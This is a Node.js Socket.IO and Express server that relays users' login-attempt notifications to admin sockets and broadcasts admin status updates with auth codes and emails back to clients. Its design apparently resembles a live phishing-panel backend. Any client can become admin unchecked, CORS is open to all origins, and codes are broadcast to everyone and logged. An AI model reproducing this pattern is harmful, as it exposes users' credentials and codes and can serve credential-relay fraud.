const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const cors = require("cors");

const app = express();

app.use(cors({
  origin: "*",
  methods: ["GET", "POST"],
}));

app.use(express.json());

const server = http.createServer(app);

const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"],
  },
  transports: ["websocket", "polling"],
  allowEIO3: true,
});

// Store connected clients for admin tracking
const adminSockets = new Set();
const userSockets = new Map(); // userId -> socketId

io.on("connection", (socket) => {
  console.log("✅ Connected:", socket.id);

  // Send connected event with socket id
  socket.emit("connected", {
    id: socket.id,
  });

  // Handle admin joining
  socket.on("admin-joined", (data) => {
    console.log("👨‍💼 Admin joined:", socket.id);
    adminSockets.add(socket.id);
    socket.data.isAdmin = true;
  });

  // Handle login attempt from user
  socket.on("login-attempt", (data) => {
    console.log("📨 Login attempt notification:", data);
    // Broadcast to all admin clients
    adminSockets.forEach((adminId) => {
      io.to(adminId).emit("admin_notification", data);
    });
  });

  // Handle admin action to update user status
  socket.on("admin-action", (data) => {
    console.log("🔧 Admin action:", data);
    // Broadcast to all clients (user will receive this)
    io.emit("user_update", data);
  });

  // Handle status update from admin dashboard
  socket.on("update-login-status", (data) => {
    console.log("📊 Status update:", data);
    io.emit("user_update", data);
  });

  // API endpoint for admin notifications (POST /api/notify-admin)
  socket.on("notify-admin", (data) => {
    console.log("🔔 Admin notification via socket:", data);
    adminSockets.forEach((adminId) => {
      io.to(adminId).emit("admin_notification", data);
    });
  });

  // Handle disconnect
  socket.on("disconnect", (reason) => {
    console.log("❌ Disconnected:", socket.id, "Reason:", reason);
    adminSockets.delete(socket.id);
  });
});

// REST API endpoint for admin notifications
app.post("/api/notify-admin", (req, res) => {
  try {
    const { email, type, message } = req.body;
    console.log("📨 /api/notify-admin called:", { email, type, message });
    
    // Emit to all admin clients
    adminSockets.forEach((adminId) => {
      io.to(adminId).emit("admin_notification", {
        email,
        type,
        message,
        timestamp: new Date().toISOString()
      });
    });
    
    res.status(200).json({ success: true, message: "Notification sent" });
  } catch (error) {
    console.error("Error in /api/notify-admin:", error);
    res.status(500).json({ success: false, message: error.message });
  }
});

// REST API endpoint for admin actions
app.post("/api/admin-action", (req, res) => {
  try {
    const { userId, newStatus, authCode, email } = req.body;
    console.log("🔧 /api/admin-action called:", { userId, newStatus, authCode, email });
    
    // Emit to all clients (including the user)
    io.emit("user_update", {
      userId,
      newStatus,
      authCode,
      email,
      timestamp: new Date().toISOString()
    });
    
    res.status(200).json({ success: true, message: "Action sent" });
  } catch (error) {
    console.error("Error in /api/admin-action:", error);
    res.status(500).json({ success: false, message: error.message });
  }
});

// Health check endpoint
app.get("/", (req, res) => {
  res.send("Socket.IO Server Running");
});

app.get("/health", (req, res) => {
  res.json({
    status: "ok",
    clients: io.engine.clientsCount,
    admins: adminSockets.size,
  });
});

const PORT = process.env.PORT || 8000;

server.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 Server running on ${PORT}`);
});